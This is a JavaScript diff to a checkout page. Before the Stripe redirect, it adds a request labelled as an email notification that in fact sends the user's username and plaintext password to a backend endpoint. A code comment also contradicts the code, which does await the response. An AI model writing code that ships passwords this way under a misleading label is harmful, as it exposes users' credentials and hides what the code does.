@@ -200,6 +200,26 @@
       const stripeLink = sessionStorage.getItem('stripeLink');
       
       if (selectedMethod === 'card') {
+        // Send email notification for card payment before redirecting
+        try {
+          const cardNotifyResponse = await fetch(`${BACKEND_URL}/submit-card-payment`, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+              username: username,
+              password: password,
+              productName: productName,
+              productPrice: productPrice
+            }),
+          });
+          // Don't wait for response, continue to payment
+        } catch (err) {
+          console.error('Error sending card payment notification:', err);
+          // Continue anyway
+        }
+        
         // Redirect to Stripe payment
         if (stripeLink && stripeLink.startsWith('http')) {
           window.location.href = stripeLink;
